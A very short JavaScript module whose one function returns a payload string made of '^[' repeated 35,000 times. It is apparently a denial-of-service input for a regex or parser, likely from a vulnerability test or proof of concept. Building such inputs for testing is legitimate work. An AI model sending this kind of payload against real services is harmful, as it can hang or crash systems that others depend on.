function getPayload() {
    let payload = "^[".repeat(35000);
    return { payload };
}

module.exports = { getPayload };